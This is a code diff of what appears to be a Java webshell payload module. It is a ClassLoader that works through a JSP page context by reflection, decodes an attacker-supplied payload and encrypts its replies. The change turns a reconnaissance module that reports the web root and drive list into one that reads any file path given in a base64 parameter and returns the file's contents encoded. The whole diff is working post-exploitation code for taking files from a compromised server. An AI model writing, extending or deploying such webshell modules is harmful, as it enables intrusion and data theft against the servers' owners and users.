@@ -1,14 +1,19 @@
-import java.io.*;
+import java.io.File;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
 
-public class file_init extends ClassLoader
+public class file_image extends ClassLoader
 {
-    public file_init(ClassLoader objParent) { super(objParent); }
-    public file_init() { super(file_init.class.getClassLoader()); }
+    public file_image(ClassLoader objParent) { super(objParent); }
+    public file_image() { super(file_image.class.getClassLoader()); }
 
     private Map<String, String> fnParseParams(String szParamStr)
     {
@@ -56,10 +61,7 @@ public class file_init extends ClassLoader
             Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
             fnFlushBuffer.invoke(objResponse, new Object[0]);
         }
-        catch (Exception exIgnored)
-        {
-
-        }
+        catch (Exception exIgnored) {}
     }
 
     private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
@@ -96,7 +98,7 @@ public class file_init extends ClassLoader
         Object objRequest = null;
         Object objResponse = null;
         OutputStream osClient = null;
-        
+
         try
         {
             Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
@@ -123,95 +125,27 @@ public class file_init extends ClassLoader
             int nParamOffset = nClassLength + 4;
             int nParamLength = abPayload.length - nParamOffset;
             String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();
-
             Map<String, String> mapParams = fnParseParams(szParam);
-            String szSplitter = mapParams.get("splitter");
-            
-            String szCurrentDir = "";
-            try
-            {
-                Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-
-                Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                Method fnGetServletPath = objRequest.getClass().getMethod("getServletPath", new Class[0]);
-                String szServletPath = (String) fnGetServletPath.invoke(objRequest, new Object[0]);
-
-                szRootPath = szRootPath.replace("\\", "/");
-                szServletPath = szServletPath.replace("\\", "/");
-                
-                if (!szRootPath.endsWith("/"))
-                    szRootPath += "/";
-                if (szServletPath.startsWith("/"))
-                    szServletPath = szServletPath.substring(1);
-                
-                String szFullPath = szRootPath + szServletPath;
-
-                szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-
-            }
-            catch (Exception e)
-            {
-                try
-                {
-                    Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                    Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-                    Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                    String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                    Method fnGetRequestURI = objRequest.getClass().getMethod("getRequestURI", new Class[0]);
-                    String szURI = (String) fnGetRequestURI.invoke(objRequest, new Object[0]);
-
-                    String szFullPath = szRootPath.replace("\\", "/") + szURI.replace("\\", "/");
-                    szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                    szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-                }
-                catch (Exception ex)
-                {
-                    szCurrentDir = System.getProperty("user.dir");
-                }
-            }
-
-            if (szCurrentDir.length() > 1 && szCurrentDir.endsWith(java.io.File.separator)) {
-                szCurrentDir = szCurrentDir.substring(0, szCurrentDir.length() - 1);
-            }
-
-            boolean bIsWindows = System.getProperty("os.name").toLowerCase().contains("win");
-
             StringBuilder sb = new StringBuilder();
-            
-            sb.append(szCurrentDir);
-            sb.append("|");
-            if (!bIsWindows)
-            {
-                // Unix-like
-                sb.append("/");
-            }
-            else
-            {
-                File[] roots = File.listRoots();
-                if (roots != null)
-                {
-                    List<String> lsDrive = new ArrayList<>();
-                    for (File root : roots)
-                    {
-                        String szPath = root.getAbsolutePath();
-                        if (szPath.endsWith(("\\")))
-                            szPath = szPath.substring(0, szPath.length() - 1);
 
-                        lsDrive.add(szPath);
-                    }
+            String z0 = mapParams.get("z0");
+            String szImgPath = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8);
 
-                    sb.append(String.join(",", lsDrive));
-                }
+            File targetFile = new File(szImgPath);
+            if (!targetFile.exists() || !targetFile.isFile())
+            {
+                sb.append("ERROR://Unable to open file.");
+                fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
+                return true;
             }
 
-            String szOutput = sb.toString();
+            byte[] abImgData = Files.readAllBytes(Paths.get(szImgPath));
+            byte[] abBase64Result = Base64.getEncoder().encode(abImgData);
 
-            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
+            String szb64Result = new String(abBase64Result, StandardCharsets.UTF_8);
+            sb.append(szb64Result);
+
+            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
         }
         catch (Exception ex)
         {
